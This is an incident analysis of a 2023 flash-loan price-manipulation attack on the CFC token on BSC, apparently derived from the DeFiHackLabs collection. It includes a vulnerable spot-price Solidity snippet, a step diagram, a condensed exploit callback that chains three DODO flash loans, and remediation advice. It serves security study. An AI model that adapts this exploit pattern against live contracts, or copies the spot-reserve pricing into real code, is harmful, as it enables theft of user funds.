# CFC — Flash Loan Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-12 |
| **Protocol** | CFC Token |
| **Chain** | BSC |
| **Loss** | ~16K USD |
| **Attacker** | Unknown |
| **Attack Contract** | [0x8213e87b...](https://bscscan.com/address/0x8213e87bb381919b292ace364d97d3a1ee38caa4) |
| **Attack Tx** | [0xa3c130ed...](https://explorer.phalcon.xyz/tx/bsc/0xa3c130ed8348919f73cbefce0f22d46fa381c8def93654e391ddc95553240c1e) |
| **Vulnerable Contract** | [0xdd9b223a...](https://bscscan.com/address/0xdd9b223aec6ea56567a62f21ff89585ff125632c) |
| **Root Cause** | CFC token internal price calculation relies on LP spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CFC_exp.sol) |

---
## 1. Vulnerability Overview

The CFC token contract uses the spot reserves of a UniswapV2 LP to calculate prices within its internal reward or swap functionality. The attacker borrowed a large amount of USDT via a DODO flash loan to manipulate the CFC/SAFE LP reserves, then executed a favorable swap at the manipulated price.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Price calculation based on spot LP reserves
function getPrice() internal view returns (uint256) {
    (uint112 reserve0, uint112 reserve1,) = cfcPair.getReserves();
    // ❌ Spot reserves — can be instantly manipulated via flash loan
    return uint256(reserve1) * 1e18 / uint256(reserve0);
}

function swap(uint256 amount) external {
    uint256 price = getPrice();  // ❌ Manipulated price
    uint256 out = amount * price / 1e18;
    // Excessive output paid out
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: CFC token internal price calculation relies on LP spot price
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────┐
│  1. DODO flash loan x3 (large USDT)  │
└──────────────────┬───────────────────┘
                   ▼
┌──────────────────────────────────────┐
│  2. Swap large USDT → CFC            │
│     → Manipulate CFC/USDT price      │
└──────────────────┬───────────────────┘
                   ▼
┌──────────────────────────────────────┐
│  3. Call internal swap() at           │
│     manipulated price                 │
│     → Receive excess SAFE or USDT    │
└──────────────────┬───────────────────┘
                   ▼
┌──────────────────────────────────────┐
│  4. Realize profit via reverse swap  │
│  5. Repay all 3 flash loans          │
└──────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function DODOFlashLoanCallback(address, uint256 amount, uint256, bytes calldata data) external {
    if (keccak256(data) == keccak256(bytes("a"))) {
        // First flash loan: manipulate CFC price
        swapUSDTtoCFC(amount);
        // Chain second flash loan
        DPPOracle2.flashLoan(amount2, 0, address(this), bytes("b"));
    } else if (keccak256(data) == keccak256(bytes("b"))) {
        // Call internal function at manipulated price
        cfcContract.internalSwap(amount);
        DPPOracle3.flashLoan(amount3, 0, address(this), bytes("c"));
    } else {
        // Realize profit then repay
        swapCFCtoUSDT(cfc.balanceOf(address(this)));
        usdt.transfer(address(DPPOracle3), amount3 + fee3);
    }
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matched Pattern |
|----|--------|--------|-----|-----------|
| V-01 | LP Spot Price Oracle | CRITICAL | CWE-1041 | 04_oracle_manipulation.md |
| V-02 | Nested Flash Loan Manipulation | HIGH | CWE-682 | 02_flash_loan.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Use Chainlink price feed
AggregatorV3Interface priceFeed = AggregatorV3Interface(chainlinkFeed);
(, int256 price,,,) = priceFeed.latestRoundData();
```

## 7. Lessons Learned

Compound price manipulation via nested flash loans (3-loan chain) can bypass simple price deviation detection mechanisms. All price oracles must use external feeds that cannot be manipulated within a single block.